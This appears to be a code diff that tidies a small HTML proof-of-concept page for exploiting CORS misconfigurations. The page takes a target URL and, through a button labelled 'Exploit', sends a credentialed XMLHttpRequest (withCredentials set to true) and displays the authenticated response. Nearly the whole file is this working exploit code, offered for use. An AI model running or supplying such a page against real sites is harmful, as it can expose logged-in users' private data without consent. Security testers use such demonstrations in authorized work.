@@ -4,39 +4,27 @@
     <link rel="stylesheet" href="cors.css">
 </head>
 <body>
-
-
     <section class="demo">
-       
         <h2>Enter The Url : </h2>
         <form action="" class="form">
-        <input type="text" class="url" id="">
-        <button type=”button” onclick="cors()">Exploit</button>
-        <!-- <button type="button" class="send" onclick="cors()">send</button> -->
-
+            <input type="text" class="url" id="url-input">
+            <button type="button" onclick="cors()">Exploit</button>
         </form>
     </section>
-
-
-<script>
-function cors() {
-let url = document.querySelector('.url').value;
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-document.querySelector('.demo').innerHTML = alert(this.responseText);
-console.log(xhttp.responseText())
-console.log(xhttp.responseText)
-}
-};
-xhttp.open('GET',url)
-xhttp.withCredentials = true;
-xhttp.send();
-}
-
-
-
-</script>
-
+    <script>
+        function cors() {
+            let url = document.getElementById('url-input').value;
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                    alert(this.responseText);
+                    console.log(xhttp.responseText);
+                }
+            };
+            xhttp.open('GET', url);
+            xhttp.withCredentials = true;
+            xhttp.send();
+        }
+    </script>
 </body>
-</html?>
+                </html>
